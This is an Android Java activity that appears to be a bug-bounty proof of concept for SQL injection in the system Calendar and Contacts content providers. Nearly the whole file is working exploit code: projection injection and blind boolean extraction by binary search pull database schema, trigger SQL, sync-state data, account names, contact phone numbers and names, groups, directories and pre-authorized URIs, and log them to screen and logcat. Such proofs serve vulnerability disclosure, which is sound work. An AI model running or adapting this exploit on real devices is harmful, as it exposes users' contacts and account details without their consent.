package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class FullProofExtractActivity extends Activity {
    private static final String TAG = "FullProof";
    private TextView logView;
    private static final String CAL_URI = "content://com.android.calendar/events";
    private static final String CONTACTS_URI = "content://com.android.contacts/contacts";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(6);
        logView.setText("Full Proof Extraction — Projection + Selection SQLi\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        calendarFullSyncState();
        contactsSelectionExtraction();
        contactsInternalTableDump();
        calendarTriggerDump();
        log("\n=== ALL PROOF EXTRACTION COMPLETE ===");
    }

    // --- CalendarProvider projection injection ---
    private String calProj(String subquery) {
        try {
            Cursor c = getContentResolver().query(Uri.parse(CAL_URI),
                new String[]{"(" + subquery + ") AS x"}, null, null, null);
            if (c != null && c.moveToFirst()) {
                String val = c.getString(0);
                c.close();
                return val;
            }
        } catch (Exception e) {
            return "[ERR:" + shorten(e.getMessage(), 40) + "]";
        }
        return "(null)";
    }

    // --- ContactsProvider selection-based blind ---
    private boolean selBool(String condition) {
        try {
            Cursor c = getContentResolver().query(Uri.parse(CONTACTS_URI),
                new String[]{"_id"}, "1=1 AND " + condition, null, null);
            if (c != null) { int n = c.getCount(); c.close(); return n > 0; }
        } catch (Exception e) { }
        return false;
    }

    private int selInt(String subquery) {
        int lo = 0, hi = 10000;
        if (!selBool(subquery + ">0")) return 0;
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (selBool(subquery + ">=" + mid)) lo = mid;
            else hi = mid - 1;
            if (hi - lo <= 1) {
                if (selBool(subquery + "=" + hi)) return hi;
                return lo;
            }
        }
        return lo;
    }

    private String selExtract(String subquery, int maxLen) {
        StringBuilder sb = new StringBuilder();
        int len = selInt("(SELECT length(" + subquery + "))");
        if (len == 0) return "(empty)";
        len = Math.min(len, maxLen);
        for (int pos = 1; pos <= len; pos++) {
            String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
            int lo = 32, hi = 126;
            while (lo < hi) {
                int mid = (lo + hi + 1) / 2;
                if (selBool(expr + ">=" + mid)) lo = mid;
                else hi = mid - 1;
            }
            if (selBool(expr + "=" + lo)) sb.append((char) lo);
            else sb.append('?');
        }
        return sb.toString();
    }

    private void calendarFullSyncState() {
        log("=== CalendarProvider: Full _sync_state Extraction ===\n");

        // Extract full sync state hex — it was 513 bytes, so hex is 1026 chars
        // Extract in chunks of 200 hex chars
        String fullHex = calProj("SELECT hex(data) FROM _sync_state LIMIT 1");
        if (fullHex != null) {
            log("[SYNC-HEX] Full hex (" + fullHex.length() + " chars):");
            // Log in 100-char chunks
            for (int i = 0; i < fullHex.length(); i += 100) {
                String chunk = fullHex.substring(i, Math.min(i + 100, fullHex.length()));
                log("  " + chunk);
            }
        }

        // Also extract trigger SQL to show database internals
        log("\n=== CalendarProvider: Trigger SQL ===\n");
        for (int i = 0; i < 5; i++) {
            String trigName = calProj("SELECT name FROM sqlite_master WHERE type='trigger' ORDER BY name LIMIT 1 OFFSET " + i);
            String trigSql = calProj("SELECT sql FROM sqlite_master WHERE type='trigger' ORDER BY name LIMIT 1 OFFSET " + i);
            log("[TRIGGER] " + trigName + ":");
            log("  " + shorten(trigSql, 200));
        }

        // Extract the view SQL
        String viewSql = calProj("SELECT sql FROM sqlite_master WHERE type='view' LIMIT 1");
        log("\n[VIEW] " + shorten(viewSql, 300));
    }

    private void contactsSelectionExtraction() {
        log("\n=== ContactsProvider: Selection-Based Data Extraction ===\n");

        // Extract all table names
        log("--- Tables in contacts DB ---");
        int tableCount = selInt("(SELECT count(*) FROM sqlite_master WHERE type='table')");
        log("Tables: " + tableCount);
        for (int i = 0; i < tableCount; i++) {
            String name = selExtract(
                "(SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET " + i + ")", 40);
            log("[TABLE] " + name);
        }

        // Extract accounts
        log("\n--- Internal accounts table ---");
        int acctCount = selInt("(SELECT count(*) FROM accounts)");
        log("Accounts: " + acctCount);
        for (int i = 0; i < acctCount; i++) {
            String name = selExtract(
                "(SELECT account_name FROM accounts LIMIT 1 OFFSET " + i + ")", 50);
            String type = selExtract(
                "(SELECT account_type FROM accounts LIMIT 1 OFFSET " + i + ")", 30);
            log("[ACCT] " + name + " (" + type + ")");
        }

        // Extract phone numbers via data table
        log("\n--- Phone numbers (via data table) ---");
        int phoneCount = selInt(
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2'))");
        log("Phone numbers: " + phoneCount);
        for (int i = 0; i < Math.min(phoneCount, 10); i++) {
            String num = selExtract(
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 1 OFFSET " + i + ")", 20);
            log("[PHONE] " + num);
        }

        // Extract names
        log("\n--- Contact names (via data table) ---");
        int nameCount = selInt(
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/name'))");
        log("Names: " + nameCount);
        for (int i = 0; i < Math.min(nameCount, 10); i++) {
            String name = selExtract(
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/name') LIMIT 1 OFFSET " + i + ")", 40);
            log("[NAME] " + name);
        }

        // Extract groups
        log("\n--- Groups ---");
        int groupCount = selInt("(SELECT count(*) FROM groups)");
        log("Groups: " + groupCount);
        for (int i = 0; i < Math.min(groupCount, 5); i++) {
            String title = selExtract(
                "(SELECT title FROM groups LIMIT 1 OFFSET " + i + ")", 40);
            String acctName = selExtract(
                "(SELECT account_name FROM groups LIMIT 1 OFFSET " + i + ")", 50);
            log("[GROUP] " + title + " (" + acctName + ")");
        }

        // Extract directories
        log("\n--- Directories ---");
        int dirCount = selInt("(SELECT count(*) FROM directories)");
        log("Directories: " + dirCount);
        for (int i = 0; i < Math.min(dirCount, 5); i++) {
            String pkg = selExtract(
                "(SELECT packageName FROM directories LIMIT 1 OFFSET " + i + ")", 50);
            String acct = selExtract(
                "(SELECT accountName FROM directories LIMIT 1 OFFSET " + i + ")", 50);
            String auth = selExtract(
                "(SELECT authority FROM directories LIMIT 1 OFFSET " + i + ")", 50);
            log("[DIR] pkg=" + pkg + " acct=" + acct + " auth=" + auth);
        }

        // Database file path
        log("\n--- Database paths ---");
        int dbCount = selInt("(SELECT count(*) FROM pragma_database_list)");
        log("Databases: " + dbCount);
        for (int i = 0; i < dbCount; i++) {
            String name = selExtract(
                "(SELECT name FROM pragma_database_list LIMIT 1 OFFSET " + i + ")", 20);
            String file = selExtract(
                "(SELECT file FROM pragma_database_list LIMIT 1 OFFSET " + i + ")", 80);
            log("[DB] " + name + " -> " + file);
        }
    }

    private void contactsInternalTableDump() {
        log("\n=== ContactsProvider: Internal Data Access ===\n");

        // pre_authorized_uris — URIs that bypass permission checks
        int preAuthCount = selInt("(SELECT count(*) FROM pre_authorized_uris)");
        log("Pre-authorized URIs: " + preAuthCount);
        for (int i = 0; i < Math.min(preAuthCount, 5); i++) {
            String uri = selExtract(
                "(SELECT uri FROM pre_authorized_uris LIMIT 1 OFFSET " + i + ")", 80);
            log("[PRE-AUTH] " + uri);
        }

        // default_directory
        int ddCount = selInt("(SELECT count(*) FROM default_directory)");
        log("Default directory entries: " + ddCount);

        // visible_contacts
        int vcCount = selInt("(SELECT count(*) FROM visible_contacts)");
        log("Visible contacts: " + vcCount);

        // mimetypes — what data types are stored
        int mtCount = selInt("(SELECT count(*) FROM mimetypes)");
        log("MIME types: " + mtCount);
        for (int i = 0; i < Math.min(mtCount, 20); i++) {
            String mt = selExtract(
                "(SELECT mimetype FROM mimetypes ORDER BY _id LIMIT 1 OFFSET " + i + ")", 60);
            log("[MIME] " + mt);
        }
    }

    private void calendarTriggerDump() {
        log("\n=== CalendarProvider: Trigger SQL (shows internal logic) ===\n");

        for (int i = 0; i < 5; i++) {
            String trigName = calProj(
                "SELECT name FROM sqlite_master WHERE type='trigger' ORDER BY name LIMIT 1 OFFSET " + i);
            if (trigName == null) break;
            String trigSql = calProj(
                "SELECT sql FROM sqlite_master WHERE type='trigger' AND name='" + trigName + "'");
            log("[TRIGGER] " + trigName);
            if (trigSql != null) {
                // Log in chunks
                for (int j = 0; j < trigSql.length(); j += 120) {
                    log("  " + trigSql.substring(j, Math.min(j + 120, trigSql.length())));
                }
            }
        }
    }

    private String shorten(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
